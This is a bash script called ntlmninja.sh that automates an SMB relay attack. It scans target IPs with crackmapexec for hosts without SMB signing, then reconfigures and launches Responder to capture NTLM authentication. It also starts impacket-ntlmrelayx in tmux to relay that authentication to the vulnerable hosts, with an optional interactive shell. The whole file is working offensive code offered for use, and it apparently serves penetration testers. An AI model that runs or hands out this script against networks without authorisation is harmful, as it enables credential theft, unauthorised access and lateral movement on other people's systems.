#!/bin/bash
set -euo pipefail

# =============================================================
# ntlmninja.sh - SMB Relay Attack Automation Script
# -------------------------------------------------------------
# Author: Howell King Jr. | Github: https://github.com/sp3ttr0
# =============================================================

# =========================
# CONFIG
# =========================
SESSION_NAME="smb_relay_attack"
TARGET_SMB_FILE="vulnerable_smb_targets.txt"
RESPONDER_CONFIG_FILE="/etc/responder/Responder.conf"

# Define color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'

interactive=false
network_interface="auto"

# Network interface (dynamically detected by default)
detect_network_interface() {
    ip route 2>/dev/null | awk '/default/ {print $5; exit}'
}

# Print help
print_help() {
    echo -e "${BLUE}Usage: $0 -f TARGET_FILE [-i NETWORK_INTERFACE] [-x] [-h]${RESET}"
    echo -e "  ${YELLOW}-f TARGET_FILE${RESET}         (Required) File containing target IPs to scan for misconfigured SMB signing."
    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: auto-detected)."
    echo -e "  ${YELLOW}-x${RESET}                     (Optional) Enable interactive shell in ntlmrelayx."
    echo -e "  ${YELLOW}-h${RESET}                     Display this help and exit."
}

# Banner function
banner() {
  echo -e "${CYAN}"
  echo -e "                                                         "
  echo -e "    ▄     ▄▄▄▄▀ █    █▀▄▀█    ▄   ▄█    ▄    ▄▄▄▄▄ ██    "
  echo -e "     █ ▀▀▀ █    █    █ █ █     █  ██     █ ▄▀  █   █ █   "
  echo -e " ██   █    █    █    █ ▄ █ ██   █ ██ ██   █    █   █▄▄█  "
  echo -e " █ █  █   █     ███▄ █   █ █ █  █ ▐█ █ █  █ ▄ █    █  █  "
  echo -e " █  █ █  ▀          ▀   █  █  █ █  ▐ █  █ █  ▀        █  "
  echo -e " █   ██                ▀   █   ██    █   ██          █   "
  echo -e "                        by sp3ttro                       "
  echo -e "                                                         "
  echo -e "                                                         "
  echo -e "${RESET}"
}       

# Check if a tool is installed
check_tool() {
    echo -e "[*] Checking ${YELLOW}$1${RESET} if installed..."
    command -v "$1" > /dev/null 2>&1 || {
        echo -e "${RED}[!] $1 is not installed. Please install it first. Exiting.${RESET}"
        exit 1
    }
}

validate_privileges() {
    # Require root privileges
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}[!] This script must be run as root. Exiting.${RESET}"
        exit 1
    fi
}

validate_target_file_arg() {
    if [ -z "${TARGET_FILE:-}" ]; then
        echo -e "${RED}[!] Missing required argument: -f TARGET_FILE${RESET}"
        print_help
        exit 1
    fi
}

validate_target_file() {
    # Check if file exists
    if [ ! -f "${TARGET_FILE}" ] || [ ! -r "${TARGET_FILE}" ]; then
        echo -e "${RED}[!] Target file '${TARGET_FILE}' not found or not readable.${RESET}"
        exit 1
    fi
}

# Validate network interface
validate_network_interface() {
    if [ -z "$network_interface" ]; then
        echo -e "${RED}[!] Could not detect network interface.${RESET}"
        exit 1
    fi

    if ! ip link show "$network_interface" >/dev/null 2>&1; then
        echo -e "${RED}[!] Network interface ${network_interface} not found.${RESET}"
        exit 1
    fi
}

# Run crackmapexec
run_crackmapexec() {
    local target_file="$1"
    local output_file="$2"
    
    echo -e "${BLUE}[*] Scanning for misconfigured SMB signing on targets...${RESET}" | tee -a attack.log
    echo -e "${GREEN}[*] Generating list of vulnerable targets in ${output_file}.${RESET}"
    
    # Run crackmapexec and let it generate the relay list
    crackmapexec smb "${target_file}" --gen-relay-list "${output_file}" 2>&1 | tee -a attack.log || {
        echo -e "${RED}[!] crackmapexec failed. Exiting.${RESET}"
        exit 1
    }
    
    if [ -s "${output_file}" ]; then
    count=$(wc -l < "${output_file}")
    echo -e "${YELLOW}[+] Found $count vulnerable target(s):${RESET}"
    while read -r ip; do
        echo -e "${YELLOW}[!] $ip${RESET}"
    done < "${output_file}"
    else
        echo -e "${RED}[!] No vulnerable targets found.${RESET}"
    fi

}

# Edit Responder.conf file
edit_responder_conf() {
    if [ -f "${RESPONDER_CONFIG_FILE}" ]; then
        if grep -qiE '^\s*SMB\s*=\s*off\s*$' "${RESPONDER_CONFIG_FILE}" && grep -qiE '^\s*HTTP\s*=\s*off\s*$' "${RESPONDER_CONFIG_FILE}"; then
            echo -e "${BLUE}[*] Responder.conf already configured with SMB and HTTP set to 'Off'.${RESET}"
        else
            echo -e "${YELLOW}[*] Updating Responder.conf to turn off SMB and HTTP...${RESET}"
            sed -i 's/^\s*SMB\s*=.*/SMB = Off/' "$RESPONDER_CONFIG_FILE"
            sed -i 's/^\s*HTTP\s*=.*/HTTP = Off/' "$RESPONDER_CONFIG_FILE"
            echo -e "${GREEN}[+] Responder.conf updated successfully.${RESET}"
        fi
    else
        echo -e "${RED}[!] Responder.conf file not found. Please ensure Responder is installed and configured properly.${RESET}"
        exit 1
    fi
}

# Function to start or attach to a tmux session and initialize windows
start_tmux_window() {
    local session_name=$1
    local window_name=$2
    local command=$3
    
    # Create the window in the tmux session
    tmux new-window -t "$session_name" -n "$window_name" 2>/dev/null || true
    
    # Send the command to the new tmux window
    tmux send-keys -t "$session_name:$window_name" "$command" C-m
}

# Function to execute SMB relay attack in tmux
run_smb_relay_attack() {
    echo -e "${BLUE}[*] Starting SMB Relay Attack...${RESET}" | tee -a attack.log

    # Ensure tmux session exists
    if ! tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
        echo -e "${GREEN}[+] Creating tmux session: $SESSION_NAME.${RESET}"
        tmux new-session -d -s "$SESSION_NAME"
    fi

    # Start Responder in a tmux window
    echo -e "${CYAN}Starting Responder on interface $network_interface...${RESET}"
    start_tmux_window "$SESSION_NAME" "responder" "responder -I $network_interface 2>&1 | tee -a responder_$(date +%s).log" || {
        echo -e "${RED}Failed to start Responder.${RESET}"
        exit 1
    }

    # Start ntlmrelayx in another tmux window
    echo -e "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"

    relay_command="impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE} 2>&1 | tee -a relay_$(date +%s).log"
    if [ "$interactive" = true ]; then
        echo -e "${YELLOW}[+] Enabling interactive shell (--interactive) in ntlmrelayx.${RESET}"
        relay_command+=" --interactive"
    fi
    
    start_tmux_window "$SESSION_NAME" "ntlmrelayx" "$relay_command" || {
        echo -e "${RED}Failed to start ntlmrelayx.${RESET}"
        exit 1
    }

    # Attach to the tmux session
    tmux -CC attach-session -t "$SESSION_NAME"
}

parse_args() {
    while getopts "f:hi:x" opt; do
        case $opt in
        f) TARGET_FILE="$OPTARG";;
        h) print_help; exit 0 ;;
        i) network_interface="$OPTARG";;
        x) interactive=true ;;
        \?) 
            echo -e "${RED}[!] Invalid option: -$OPTARG${RESET}" >&2
            print_help
            exit 1
            ;;
        :)
            echo -e "${RED}[!] Option -$OPTARG requires an argument.${RESET}" >&2
            print_help
            exit 1
            ;;
        esac
    done
}

validate() {
    validate_privileges
    validate_target_file_arg
    validate_target_file
    validate_network_interface
}


# Start SMB Relay Attack
check_tmux_session() {
    if tmux has-session -t "$SESSION_NAME" 2>/dev/null; then
        echo -e "${YELLOW}[!] Tmux session '${SESSION_NAME}' already exists.${RESET}"
        echo -e "${BLUE}Do you want to:${RESET}"
        echo -e "  [a] Attach to existing session"
        echo -e "  [k] Kill existing session"
        read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice
    
        case "$user_choice" in
            [aA])
                echo -e "${GREEN}[*] Attaching to existing tmux session...${RESET}"
                tmux -CC attach-session -t "$SESSION_NAME"
                exit 0
                ;;
            [kK])
                echo -e "${RED}[*] Killing existing tmux session...${RESET}"
                tmux kill-session -t "$SESSION_NAME"
                echo -e "${GREEN}[*] Session killed. Exiting.${RESET}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid choice. Exiting.${RESET}"
                exit 1
                ;;
        esac
    fi
}

# Check if required tools are installed
check_dependencies() {
    local tools=("tmux" "responder" "impacket-ntlmrelayx" "crackmapexec")

    for t in "${tools[@]}"; do
        check_tool "$t"
    done
}

main() {
    parse_args "$@"
    
    if [ "$network_interface" = "auto" ]; then
        network_interface="$(detect_network_interface)"
    fi
    
    if [ -z "$network_interface" ]; then
        echo -e "${RED}[!] No active network interface detected (no default route).${RESET}"
        exit 1
    fi
        
    validate
    
    check_dependencies

    # Show the banner
    banner

    check_tmux_session
    
    run_crackmapexec "$TARGET_FILE" "$TARGET_SMB_FILE" || exit 1

    if [ ! -s "$TARGET_SMB_FILE" ]; then
        echo -e "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
        exit 0
    fi

    edit_responder_conf || exit 1
    
    sleep 5
    run_smb_relay_attack
}

main "$@"
